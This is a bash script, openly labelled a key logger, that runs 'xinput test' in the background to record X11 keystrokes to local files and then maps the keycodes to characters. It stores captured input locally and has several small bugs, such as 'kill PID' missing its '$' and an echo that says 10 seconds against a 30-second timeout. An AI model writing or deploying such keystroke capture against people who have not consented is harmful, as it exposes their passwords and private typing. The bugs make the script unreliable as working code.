#!/bin/bash


: > keylog.txt
: > Fkeylog.txt
: > F1.txt

echo "Starting Key logger and sending to Background! for 10sec "

timeout 30s xinput test 9 > keylog.txt &
echo "Started! !"

fun_in() {
cat keylog.txt | grep -v 'key release' | awk {'print $3'} > Fkeylog.txt

declare -A mapping
mapping[9]='Escape NoSymbol Escape'
mapping[10]='1 or !'
mapping[11]='2 or @'
mapping[12]='3 or #'
mapping[13]='4 or $'
mapping[14]='5 or %'
mapping[15]='6 or ^'
mapping[16]='7 or &'
mapping[17]='8 or *'
mapping[18]='9 or ('
mapping[19]='0 or )'
mapping[20]='- or _'
mapping[21]='= or +'
mapping[22]='BackSpace'
mapping[23]='Tab ISO_Left_Tab Tab ISO_Left_Tab'
mapping[24]='q'
mapping[25]='w'
mapping[26]='e'
mapping[27]='r'
mapping[28]='t'
mapping[29]='y'
mapping[30]='u'
mapping[31]='i'
mapping[32]='o'
mapping[33]='p'
mapping[34]='bracketleft'
mapping[35]='bracketright '
mapping[36]='Return NoSymbol Return'
mapping[37]='Ctrl'
mapping[38]='a'
mapping[39]='s'
mapping[40]='d'
mapping[41]='f'
mapping[42]='g'
mapping[43]='h'
mapping[44]='j'
mapping[45]='k'
mapping[46]='l'
mapping[47]=';'
mapping[48]='apostrophe quotedbl'
mapping[49]='grave asciitilde grave asciitilde'
mapping[50]='Shift_L NoSymbol Shift_L'
mapping[51]='\ |'
mapping[52]='z'
mapping[53]='x'
mapping[54]='c'
mapping[55]='v'
mapping[56]='b'
mapping[57]='n'
mapping[58]='m'
mapping[59]=', <'
mapping[60]='. >'
mapping[61]='/ ?'
mapping[62]='Shift_R'
mapping[63]='KP_Multiply KP_Multiply KP_Multiply KP_Multiply KP_Multiply KP_Multiply XF86ClearGrab'
mapping[64]='Alt_L Meta_L Alt_L Meta_L'
mapping[65]='  '
mapping[66]='Caps_Lock'
mapping[67]='F1'
mapping[68]='F2'
mapping[69]='F3'
mapping[70]='F4'
mapping[71]='F5'
mapping[72]='F6'
mapping[73]='F7'
mapping[74]='F8'
mapping[75]='F9'
mapping[76]='F10'
mapping[77]='Num_Lock'
mapping[78]='Scroll_Lock'
mapping[79]='KP_Home KP_7 KP_Home KP_7'
mapping[80]='KP_Up KP_8 KP_Up KP_8'
mapping[81]='KP_Prior KP_9 KP_Prior KP_9'
mapping[82]='KP_Subtract KP_Subtract KP_Subtract KP_Subtract KP_Subtract KP_Subtract XF86Prev_VMode'
mapping[83]='KP_Left KP_4 KP_Left KP_4'
mapping[84]='KP_Begin KP_5 KP_Begin KP_5'
mapping[85]='KP_Right KP_6 KP_Right KP_6'
mapping[86]='KP_Add KP_Add KP_Add KP_Add KP_Add KP_Add XF86Next_VMode'
mapping[87]='KP_End KP_1 KP_End KP_1'
mapping[88]='KP_Down KP_2'
mapping[89]='KP_Next KP_3'
mapping[90]='KP_Insert KP_0'
mapping[91]='KP_Delete KP_Decimal'
mapping[92]='ISO_Level3_Shift NoSymbol ISO_Level3_Shift'
mapping[94]='less greater less greater bar brokenbar bar'
mapping[95]='F11'
mapping[96]='F12'
mapping[98]='Katakana NoSymbol Katakana'
mapping[99]='Hiragana NoSymbol Hiragana'
mapping[100]='Henkan_Mode NoSymbol Henkan_Mode'
mapping[101]='Hiragana_Katakana NoSymbol Hiragana_Katakana'
mapping[102]='Muhenkan NoSymbol Muhenkan'
mapping[104]='KP_Enter NoSymbol KP_Enter'
mapping[105]='Control_R NoSymbol Control_R'
mapping[106]='KP_Divide KP_Divide KP_Divide KP_Divide KP_Divide KP_Divide XF86Ungrab'
mapping[107]='Print Sys_Req Print Sys_Req'
mapping[108]='Alt_R Meta_R Alt_R Meta_R'
mapping[109]='Linefeed NoSymbol Linefeed'
mapping[110]='Home'
mapping[111]='Up'
mapping[112]='Prior NoSymbol Prior'
mapping[113]='Left'
mapping[114]='Right'
mapping[115]='End'
mapping[116]='Down'
mapping[117]='Next'
mapping[118]='Insert'
mapping[119]='Delete'


while IFS= read -r num; do

if [[ -n "${mapping[$num]}" ]]; then
	printf "%s " "${mapping[$num]} " | awk '{print $1}' >> F1.txt
else
	output="unknown mapping"
fi

#echo "Output : $output"


done < Fkeylog.txt
	
awk '{printf "%s " ,$0}' F1.txt  > Fkeylog.txt	

}

last_fun() {

echo ""
echo "Ensuring no Background process are running!"
echo ""
pid_fun=""
pid_fun=$(pgrep -f 'fun_in')
PID=""
PID=$(ps aux | grep 'xinput test' | grep -v grep | awk '{print $2}')
if [ -n "$PID" ]; then

	echo "Killing the running process -- $PID"; 
	#KILLING THE RUNNING PROCESS
	ps aux | grep 'xinput test' | grep -v grep | awk '{print $2}' | head -1 | xargs kill
else
	echo "No running process of XINPUT......"
fi
echo ""

if [ -n "$pid_fun" ]; then
	echo "Killing Function Background process-----$pid_fun"
	kill PID

else
	echo "No running Background Function...."

fi

}



for ((i=0; i<3; i++)); do
fun_in &
sleep 5
done

trap last_fun EXIT
